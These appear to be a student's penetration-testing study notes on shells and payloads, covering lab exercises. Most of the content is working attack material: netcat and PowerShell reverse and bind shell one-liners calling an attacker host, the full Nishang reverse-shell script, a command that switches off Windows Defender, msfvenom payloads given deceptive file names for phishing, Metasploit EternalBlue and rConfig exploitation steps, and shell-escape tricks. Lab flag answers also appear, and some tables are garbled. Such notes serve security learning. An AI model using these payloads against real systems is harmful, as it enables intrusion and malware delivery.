# Shells Jack Us In, Payloads Deliver Us Shells

## Overview

A shell is an OS interface. In pentesting, "getting a shell" means you've exploited a vulnerability to gain interactive remote access to a target system.

## Payloads

A payload is the code/data that does the actual work. In exploitation: crafted code that exploits a vulnerability to deliver a shell. Can refer to malware types depending on context.

# CAT5 Security's Engagement Preparation

## Module Roadmap


| Topic                | What You'll Demonstrate                                                |
| -------------------- | ---------------------------------------------------------------------- |
| **Shell Basics**     | Bind shell on Linux + Reverse shell on Windows                         |
| **Payload Basics**   | Launch via MSF, build from ExploitDB PoC, manual payload creation      |
| **Shell on Windows** | Use recon results to craft/deploy a payload → get a shell              |
| **Shell on Linux**   | Same approach, Linux target                                            |
| **Web Shell**        | Identify web app + language, deploy browser-accessible shell           |
| **Spotting Shells**  | Detect payloads/shells by analyzing host information (defensive angle) |
| **Final Challenge**  | Full chain: select → craft → deploy payload → extract info from hosts  |


## Key Takeaway

The module follows a realistic engagement flow: recon is given to you, your job is exploitation and shell establishment across multiple OS/environments. The final challenge ties everything together.

# Anatomy of a Shell

A shell sesion has 3 main components:
OS -> Terminal Emulator -> command Language Interpreter

## Terminal Emulators (by OS)


| OS                 | Examples                                      |
| ------------------ | --------------------------------------------- |
| **Windows**        | Windows Terminal, cmder, PuTTY                |
| **Linux**          | GNOME Terminal, Konsole, xterm, MATE Terminal |
| **macOS**          | Terminal, iTerm2                              |
| **Cross-platform** | kitty, Alacritty                              |


## Command Language Interpreters

The program that reads and executes your commands. Also called shell scripting languages — relevant in MITRE ATT&CK under Execution techniques.

### How to identify which interpreter is running

```bash
# Check running processes
ps

# Check environment variable
env | grep SHELL
# -> SHELL=/bin/bash
```

Visual cue: The `$` prompt → Bash, Ksh, POSIX shells.

## Key Takeaway

- A terminal emulator is not locked to one interpreter, you can run PowerShell inside MATE Terminal on Linux, for example
- Knowing the interpreter on a target tells you which commands and scripts will work
- This matters in exploitation: wrong shell language = broken payload

# Bind Shells

The target opens a listener and waits for the attacker to connect to it. 

## Challenges with Bind Shells


| Challenge                             | Why it's a problem                           |
| ------------------------------------- | -------------------------------------------- |
| Listener must already exist on target | You need a way to start it first             |
| Incoming firewall rules               | Admins block unsolicited inbound connections |
| NAT/PAT on network edge               | Hard to reach from outside the network       |
| OS firewalls (Windows & Linux)        | Block connections not tied to trusted apps   |


> Bind shells are easier to detect and bloc, reverse shellls are preferred in real engagements.

## Tool: GNU Netcat (`nc`)

Supports: TCP, UDP, Unix sockets, IPv4/IPv6, proxying, I/O redirection

## Commands

### Step 1 - Start listener on target (server)

```bash
nc -lvnp 7777
# -l    listen mode
# -v    verbose
# -n    no DNS resolution
# -p    specify port
```

### Step 2 - Connect from attack box (client)

```bash
nc -nv 10.129.41.200 7777
```

### Step  - Upgrade to actual bind shell (server-side payload)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
# rm -f /tmp/f       → remove existing pipe file if any
# mkfifo /tmp/f      → create a named pipe (FIFO) for bidirectional communication
# cat /tmp/f         → read from the pipe
# | /bin/bash -i     → pipe into interactive bash shell
# 2>&1               → redirect stderr to stdout (so errors are also sent back)
# | nc -l ... 7777   → send shell output over netcat listener
# > /tmp/f           → redirect nc input back into the pipe (closes the loop)
```

### Step 4 - Connect to bind shell from attack box

```bash
nc -nv 10.129.41.200 7777
# You now have an interactive shell on the target
```

### Identify Current Shell

```bash
ps                  # see running shell process
env | grep SHELL    # check SHELL environment variable
```

## Key Takeaway


| Concept             | Detail                                    |
| ------------------- | ----------------------------------------- |
| Bind shell flow     | Target listens → Attacker connects        |
| Real shell requires | Named pipe + bash redirect + netcat       |
| Plain `nc` session  | Just a TCP pipe, NOT a shell              |
| Main weakness       | Inbound connections are easily firewalled |


# Reverse Shells

A reverse shell inverts the typical connection model:

- The attack box runs a listener
- The target initiates the outbound connection back to the attacker

This contrasts with a bind shell, where the attacker connects **to** the target.

## Why Reverse Shells Are Preferred

- Outbound connections are less likely to be blocked by firewalls than inbound ones
- Common ports like 443 (HTTPS) are rarely restricted outbound, making traffic blend in
- Admins tend to monitor incoming traffic more carefully than outgoing

> Exception: firewalls with deep packer inspection (Layer 7) can still detect reverse shell traffic regardless of port, by inspecting packet contents.

## Hands-On: PowerShell Reverse Shell (Windows)


| Side             | Role              | Tool                 |
| ---------------- | ----------------- | -------------------- |
| Attack box       | Server / listener | `nc -lvnp 443`       |
| Target (Windows) | Client            | PowerShell one-liner |


## Key commands

```bash
# Attack box — start listener
sudo nc -lvnp 443
```

```powershell
# Target — initiate reverse shell
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## AV Evasion Note

Windows Defender blocked the payload out of the box, flagged as malicious content. For lab purposes, it was disabled with:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

In real engagements, bypassing AV is a significant challenge covered in later modules.

## Key Takeaways

- Always check what tools are natively available on the target ("living off the land") — Netcat isn't native to Windows
- Payload delivery difficulty increases as the module progresses
- Public reverse shell resources (like RevShells.com) exist, but may be known to defenders — customization may be needed

# Introduction to Payloads

A payload is the command and/or code that exploits a vulnerability. Think of it like the message in an email. It's the actual content being delivered. Payloads aren't magic; they're just instructions telling the target computer what to do.

## One-liner Breakdown: Netcat/Bash Reverse Shell (Linux)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```


| Part | Command                        | Purpose                                                            |
| ---- | ------------------------------ | ------------------------------------------------------------------ |
| 1    | `rm -f /tmp/f`                 | Removes `/tmp/f` if it exists (`-f` ignores if not found)          |
| 2    | `mkfifo /tmp/f`                | Creates a **FIFO named pipe** at `/tmp/f`                          |
| 3    | `cat /tmp/f                    | `                                                                  |
| 4    | `/bin/bash -i 2>&1             | `                                                                  |
| 5    | `nc 10.10.14.12 7777 > /tmp/f` | Connects back to the attack box and redirects output into the pipe |


## One-Liner Breakdown: PowerShell Reverse Shell (Windows)

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


| Part | Code                                                                              | Purpose                                                                   |
| ---- | --------------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| 1    | `powershell -nop -c`                                                              | Runs PowerShell with no profile (`-nop`), executes a command block (`-c`) |
| 2    | `$client = New-Object System.Net.Sockets.TCPClient('IP',443)`                     | Creates a **TCP socket** connecting to the attack box                     |
| 3    | `$stream = $client.GetStream()`                                                   | Gets the **network stream** for communication                             |
| 4    | `[byte[]]$bytes = 0..65535                                                        | %{0}`                                                                     |
| 5    | `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`                      | **Loop** that keeps reading incoming data from the stream                 |
| 6    | `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)` | **Decodes** the byte stream into ASCII text                               |
| 7    | `$sendback = (iex $data 2>&1                                                      | Out-String)`                                                              |
| 8    | `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '`                              | Builds the **shell prompt** string (e.g. `PS C:\Users\>` )                |
| 9    | `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)`                       | Encodes output back to **ASCII bytes**                                    |
| 10   | `$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()`                     | **Sends** the output back to the attack box                               |
| 11   | `$client.Close()`                                                                 | **Terminates** the TCP connection when done                               |


## Nishang: Script Version of the Same Shell

The one-liner can also be written as a full `.ps1` script. The Nishang project (`Invoke-PowerShellTcp`) is a well-known example, it supports both reverse and bind modes and adds extra info like username and hostname on connection.

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```

```powershell
# Usage examples from Nishang:
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Invoke-PowerShellTcp -Bind -Port 4444
Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444  # IPv6
```

## Key Takeaways

- Payloads are just code/commands, demystify them by reading what each part does
- The payload you use depends on what OS, shell, and languages are available on the target
- AV blocks payloads by recognizing patterns in the code. Understanding the payload helps ypu know what to modify to evade detection
- Not all payloads are manual one-liners. Frameworks like Metasploit automate payload generation and delivery (covered next)

# Automating Payloads & Delivery with Metasploit

## Overview

Metasploiot is an automated attack framework by Rapid7 that streamlines exploitation using pre-built modules. It handles payload generation, delivery, and shell establishment. But you still need to understand what it's doing under the hood.

## Workflow: Exploiting a Windows Target via SMB

### 1. Launch Metasploit

```bash
sudo msfconsole
```

### 2. Enumerate the Target First

```bash
nmap -sC -sV -Pn 10.129.164.25
```

> Identified open ports: 135, 139, 445 -> SMB is the attack vector

### 3. Search for a Module

```bash
search smb
```

### 4. Select the module

```bash
use 56
# or
use exploit/windows/smb/psexec
```

### 5. Check Options

```bash
show options
```

### 6. Configure the Module

```bash
set RHOSTS 10.129.180.71        # target IP
set SHARE ADMIN$                # admin share to upload payload
set SMBUser htb-student         # valid username on target
set SMBPass HTB_@cademy_stdnt!  # valid password
set LHOST 10.10.14.222          # your tun0 IP (attack box)
```

### 7. Run the Exploit

```bash
exploit
#or
run
```

### 8. Drop into a System Shell from Meterpreter

```bash
shell
```

## Module Anatomy: `exploit/windows/smb/psexec`


| Part       | Meaning                                    |
| ---------- | ------------------------------------------ |
| `exploit/` | Module type                                |
| `windows/` | Target OS                                  |
| `smb/`     | Attack vector / service                    |
| `psexec`   | Tool uploaded to target to execute payload |


## Key Concepts


| Concept             | Detail                                                                                                      |
| ------------------- | ----------------------------------------------------------------------------------------------------------- |
| **Default payload** | `windows/meterpreter/reverse_tcp` — Metasploit uses this automatically                                      |
| **Meterpreter**     | Advanced payload using **in-memory DLL injection** — stealthier than a raw TCP shell                        |
| **psexec module**   | Requires valid credentials; uploads a randomly-named service to execute the payload; cleans up after itself |
| `use <number>`      | Module numbers are **relative to your search** — they can change, don't rely on them across sessions        |


## Meterpreter vs Raw Shell


| Feature              | Raw Netcat Shell | Meterpreter         |
| -------------------- | ---------------- | ------------------- |
| File upload/download | ✗                | ✓                   |
| Keylogger            | ✗                | ✓                   |
| Process management   | ✗                | ✓                   |
| Service control      | ✗                | ✓                   |
| Stealth (in-memory)  | ✗                | ✓                   |
| Full system commands | ✓ (native)       | Via `shell` command |


## Key Takeaway

Metasploit makes exploitation easier, but **you must understand what your tools are doing** — especially in live engagements where the wrong move can be destructive. Use `?` inside meterpreter to explore available commands, and drop into `shell` when you need native OS commands.

# Crafting Payloads with MSFvenom

## Overview

MSFvenom is used when you can't directly reach a target over the network with Metasploit. Instead, you craft a standalone payload file and deliver it via social engineering (email, download link, USB, etc.). It also supports encoding/encryption to bypass AV detection.

## List Available Payloads

```bash
msfvenom -l payloads
```

## Staged vs. Stageless Payloads


|                  | Staged                                                       | Stageless                                           |
| ---------------- | ------------------------------------------------------------ | --------------------------------------------------- |
| **How it works** | Sends a small initial stage → downloads rest from attack box | Entire payload sent at once                         |
| **Memory**       | Uses less initial memory, but needs network callback         | Larger, fully self-contained                        |
| **Best for**     | Good bandwidth, stable connections                           | Low bandwidth, unstable connections, better evasion |
| **Name pattern** | Slashes between stages: `shell/reverse_tcp`                  | All in one word: `shell_reverse_tcp`                |


## Quick identification examples


| Payload                               | Type                                               |
| ------------------------------------- | -------------------------------------------------- |
| `linux/x86/shell/reverse_tcp`         | ✅ Staged (`/shell/` + `/reverse_tcp` = two stages) |
| `linux/zarch/meterpreter_reverse_tcp` | ✅ Stageless (combined into one)                    |
| `windows/meterpreter/reverse_tcp`     | ✅ Staged                                           |
| `windows/meterpreter_reverse_tcp`     | ✅ Stageless                                        |


## Building Payloads

### Linux Stageless Payload (ELF)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

### Windows Stageless Payload (EXE)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

## Command Breakdown


| Flag/Option                   | Purpose                               |
| ----------------------------- | ------------------------------------- |
| `-p`                          | Specifies the payload to use          |
| `linux/x64/shell_reverse_tcp` | OS / architecture / payload type      |
| `LHOST=`                      | Attack box IP to call back to         |
| `LPORT=`                      | Port on attack box to connect to      |
| `-f elf`                      | Output format (Linux binary)          |
| `-f exe`                      | Output format (Windows executable)    |
| `> filename`                  | Output file name — make it convincing |


### Catching the Shell

```bash
# Start listener before payload executes
sudo nc -lvnp 443
```

Once the victim executes the file, she shell connects back automatically.

## Payload Delivery Methods


| Flag/Option                   | Purpose                               |
| ----------------------------- | ------------------------------------- |
| `-p`                          | Specifies the payload to use          |
| `linux/x64/shell_reverse_tcp` | OS / architecture / payload type      |
| `LHOST=`                      | Attack box IP to call back to         |
| `LPORT=`                      | Port on attack box to connect to      |
| `-f elf`                      | Output format (Linux binary)          |
| `-f exe`                      | Output format (Windows executable)    |
| `> filename`                  | Output file name — make it convincing |


## AV Evasion Note

Without encoding or encryption, these payloads will be caught by Windows Defender. The naming trick (e.g. `SalaryIncrements2026.exe`) targets human behavior, not AV. Encoding/encryption techniques to bypass AV are covered in later sections.

## Key Takeaway

MSFvenom gives you flexibility when direct network access isn't possible. The output is a standalone file you deliver through any available vector. The payload's name, format, and delivery method are all part of the attack. Social engineering is as important as the technical payload itself.

# Infiltrating Windows

## Overview

Windows dominates enterprise environments and has a massive attack surface. This section covers how to fingerprint Windows targets, select payload types, and execute a full compromise walkthrough using EternalBlue.

## Notable Windows Vulnerabilities


| Vulnerability  | CVE/ID         | Key Detail                                                                    |
| -------------- | -------------- | ----------------------------------------------------------------------------- |
| MS08-067       | —              | Critical SMB flaw; used by Conficker worm and Stuxnet                         |
| EternalBlue    | MS17-010       | NSA leak via Shadow Brokers; used in WannaCry & NotPetya; affects SMBv1       |
| PrintNightmare | —              | RCE via Windows Print Spooler; grants SYSTEM access                           |
| BlueKeep       | CVE-2019-0708  | RCE via RDP; affects Windows 2000 through Server 2008 R2                      |
| Sigred         | CVE-2020-1350  | DNS flaw; can grant Domain Admin privileges                                   |
| SeriousSam     | CVE-2021-36934 | Reads SAM database via volume shadow copies; dumps credentials                |
| Zerologon      | CVE-2020-1472  | Cryptographic flaw in Netlogon; ~256 guesses to take over a domain controller |


## Fingerprinting a Windows Host

### Method 1 - TTL via Ping

```bash
ping 192.168.86.39
```

> Windows typically responds with TTL = 128. Linux is usually 64.

### Method 2 - OS Detection with Nmap

```bash
sudo nmap -v -O 192.168.86.39
```

> Look for `OS CPE: cpe:/o:microsoft:windows_10` in output.

### Method 3 - Banner Grabbing

```bash
sudo nmap -v 192.168.86.39 --script banner.nse
```

> Attempts to read service banners from open ports to identify software/versions.

### Fallback if scans return little

```bash
sudo nmap -A -Pn 192.168.86.39
```

## Windows Payload Types


| Type           | Extension | Use Case                                                     |
| -------------- | --------- | ------------------------------------------------------------ |
| **DLL**        | `.dll`    | DLL injection or hijacking → elevate to SYSTEM, bypass UAC   |
| **Batch**      | `.bat`    | Automate CLI tasks, open ports, enumerate host               |
| **VBScript**   | `.vbs`    | Phishing, macro execution in Office documents                |
| **MSI**        | `.msi`    | Masquerade as installer → run with `msiexec` → reverse shell |
| **PowerShell** | `.ps1`    | Full scripting, .NET objects, cmdlets, cloud interaction     |


## Payload Generation & Transfer Tools


| Tool                    | Purpose                                                 |
| ----------------------- | ------------------------------------------------------- |
| MSFVenom / Metasploit   | All-in-one payload generation and delivery              |
| Payloads All The Things | Cheat sheets for one-liners and transfers               |
| Mythic C2               | Alternative C2 framework to Metasploit                  |
| Nishang                 | Offensive PowerShell scripts and implants               |
| Darkarmour              | Obfuscated binary generation for Windows                |
| Impacket                | Python toolkit: psexec, smbclient, SMB server, Kerberos |
| SMB / FTP / HTTP        | File transfer protocols for payload delivery            |


## Full Compromise Walkthrough: Eternal Blue (MS17-010)

### Step 1 - Enumerate Target

```bash
nmap -v -A 10.129.201.97
```

> Found: Windows Server 2016, ports 80 (IIS), 135, 139, 445 (SMB) open.

### Step 2 - Validate Vulnerability

```bash
# In msfconsole:
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.129.201.97
run
```

> Output: Host is likely VULNERABLE to MS17-010!

### Step 3 - Find & Select Exploit

```bash
search eternal
use 2 # ms17_010_psexec
```

### Step 4 - Configure & Validate Options

```bash
options
set RHOSTS 10.129.201.97
set LHOST 10.10.14.12
set LPORT 4444
show options   # verify before running
```

### Step 5 - Execute

```bash
exploit
```

> Result: `NT AUTHORITY\SYSTEM` shell via Meterpreter.

### Step 6 - Check Current User & Drop to System Shell

```bash
getuid          # confirms NT AUTHORITY\SYSTEM
shell           # drops into cmd.exe or PowerShell
```

## CMD vs PowerShell - When to Use Each


| Use CMD when...                          | Use PowerShell when...             |
| ---------------------------------------- | ---------------------------------- |
| Target is old (pre-Windows 7)            | You need cmdlets or custom scripts |
| Simple access / basic commands           | You need .NET object interaction   |
| Using batch files or net commands        | Working with cloud services        |
| Execution Policy may block scripts       | Using Aliases                      |
| Stealth is critical (no command history) | Stealth is less of a concern       |


> Prompt tells you which shell you're in:
>
> - `C:\Windows\system32` -> CMD
> - `PS C:\Windows\system32` -> PowerShell

## Bonus: WSL & PowerShell Core Blind Spots

- WSL (Windows Subsystem for Linux): Network traffic to/from WSL instances is not parsed by Windows Firewall or Defender — a known blind spot actively exploited in the wild
- PowerShell Core on Linux: Carries over PS functionality and has been observed evading AV/EDR detection
- Both vectors are still not well understood defensively — worth watching

## Connect to HTB

#### What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')

> `.bat`

#### What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)

> `MS17-010`

#### Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.129.201.97
run 

search eternal
use 2 # ms17_010_psexec

options
set RHOSTS 10.129.201.97
set LHOST 10.10.14.12
set LPORT 4444
show options   # verify before running

exploit

# The eternalblue module is notoriously unstable on Server 2016. The psexec version is more reliable for this OS
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.129.46.32
set LHOST 10.10.14.76
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
exploit

shell

cd ..
cd ..
dir
more flag.txt
EB-Still-W0rk$
```

# Infiltrating Unix/Linux

## Overview

Over 70% of web servers run Unix/Linux, making it a critical attack surface. The approach mirrors Windows: enumerate -> identify vulnerable application -> find/load exploit -> gain shell -> stabilize it.

## Pre-Attack Checklist for Linux Targets

Before choosing an exploit path, answer:


| Question                           | Why It Matters                                        |
| ---------------------------------- | ----------------------------------------------------- |
| What Linux distro?                 | Affects available tools and shell interpreters        |
| What shells/languages exist?       | Determines payload options (Python, Perl, Bash, etc.) |
| What is the system's network role? | Pivoting potential                                    |
| What application is hosted?        | Primary attack vector                                 |
| Known CVEs?                        | Directs exploit research                              |


## Full Compromise Walkthrough: rConfig 3.9.6

### Step 1 - Enumerate the Target

```bash
nmap -sC -sV 10.129.201.101
```

Key findings from output:


| Port   | Service    | Detail                           |
| ------ | ---------- | -------------------------------- |
| 21     | FTP        | vsftpd 2.0.8+                    |
| 22     | SSH        | OpenSSH 7.4                      |
| 80/443 | HTTP/HTTPS | Apache 2.4.6, PHP 7.2.34, CentOS |
| 3306   | MySQL      | Unauthorized access              |
| 111    | rpcbind    | RPC service                      |


> Navigating to the IP in a browser reveals rConfig 3.9.6 — a network device configuration management tool. Compromise = access to all managed routers/switches.

### Step 2 — Find an Exploit

#### Option A - MSF search

```bash
# In msfconsole:
search rconfig
```

#### Option B - External research

```bash
# Search engine: "rConfig 3.9.6 exploit metasploit github"
# Find: rconfig_vendors_auth_file_upload_rce.rb
```

#### Option C - Add a custom module from GitHub

```bash
# Find where MSF stores exploits:
locate exploits
# Modules path on Pwnbox:
# /usr/share/metasploit-framework/modules/exploits

# Copy the .rb file from GitHub into:
# /usr/share/metasploit-framework/modules/exploits/linux/http/

# Keep MSF updated:
apt update; apt install metasploit-framework
```

### Step 3 - Load & Configure the Exploit

```bash
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
options
# Set RHOSTS, LHOST, LPORT as needed
```

### Step 4 - Execute

```bash
exploit
```

What the exploit does internally:

1. Checks for vulnerable rConfig version
2. Authenticates to the web login
3. Uploads a PHP-based reverse shell payload
4. Triggers it
5. Deletes the uploaded file (cleanup)
6. Returns a Meterpreter session

### Step 5 - Drop into System Shell

```bash
shell
```

> Shell lands as the apache user (the process owner of the web server).

## Stabilizing: Non-TTY -> TTY Shell

After dropping into `shell`, you get a non-TTY shell: no prompts, limited functionality, and commands like `su` and `sudo` won't work.

### Check if Python is available:

```bash
which python
```

### Spawn a proper TTY shell

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

> Result: Full interactive prompt (`sh-4.2$`) with access to all system commands.

## Key Takeaways

- Always check the application version visible on login pages - it directly leads to CVE research.
- If an MSF module doesn't show up in `search`, check Rapid7's GitHub and manually add the `.rb`file
- Landing as a low-privilege user (like apache) is expected - TTY stabilization and privilege escalation come next
- rConfig is a high-value target because compromising it means access to all managed network devices

## Connect to HTB

#### What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?

> php

#### Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-28 18:33 -04
Nmap scan report for 10.129.46.53
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-title: Did not follow redirect to https://10.129.46.53/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
3306/tcp open  mysql    MySQL (unauthorized)
Service Info: Host: the

```

```bash
msfconsole
search rconfig 3.9.6
use 0
set RHOSTS 10.129.46.53
set LHOST 10.10.14.76
run

shell

cd ~/devidedetails
cat edgerouter-isp.yml

# me: configure top level configuration
#   cisco.ios.ios_config:
#   lines: hostname edgerouter-isp
```

# Spawning Interactive Shells

## Overview

When you land on a system with a limited/jail shell, you need to upgrade it to a fully interactive TTY. Python isn't always available, so knowing multiple methods is essential.

> Note: `/bin/sh` and `/bin/bash` are interchangeable in all commands below - use whatever shell binary exists on the target.

## Shell Spawning Methods

### Direct Shell Execution

```bash
/bin/sh -i
```

> Executes the shell in interactive mode (`-i`)

### Python (covered in previous section)

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

### Perl

```bash
# From command line:
perl -e 'exec "/bin/sh";'

# From inside a script:
perl: exec "/bin/sh";
```

### Ruby

```bash
# From inside a script:
ruby: exec "/bin/sh"
```

### Lua

```bash
# From inside a script:
lua: os.execute('/bin/sh')
```

### AWK

```bash
awk 'BEGIN {system("/bin/sh")}'
```

> AWK is a C-like pattern processing language present on most Unix/Linux systems.

### Find

```bash
# Using awk via find:
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# Direct shell via find's exec:
find . -exec /bin/sh \; -quit
```

### VIM

```bash
# Method 1 — launch with shell command:
vim -c ':!/bin/sh'

# Method 2 — from inside vim:
vim
:set shell=/bin/sh
:shell
```

## Quick Reference table


| Method      | Command                                                           | Requires   |
| ----------- | ----------------------------------------------------------------- | ---------- |
| Direct      | `/bin/sh -i`                                                      | sh binary  |
| Python      | `python -c 'import pty; pty.spawn("/bin/sh")'`                    | Python     |
| Perl        | `perl -e 'exec "/bin/sh";'`                                       | Perl       |
| Ruby        | `ruby: exec "/bin/sh"`                                            | Ruby       |
| Lua         | `lua: os.execute('/bin/sh')`                                      | Lua        |
| AWK         | `awk 'BEGIN {system("/bin/sh")}'`                                 | AWK        |
| Find+AWK    | `find / -name file -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | find + AWK |
| Find direct | `find . -exec /bin/sh \; -quit`                                   | find       |
| VIM         | `vim -c ':!/bin/sh'`                                              | vim        |


## Post-Shell: Check Your Permissions

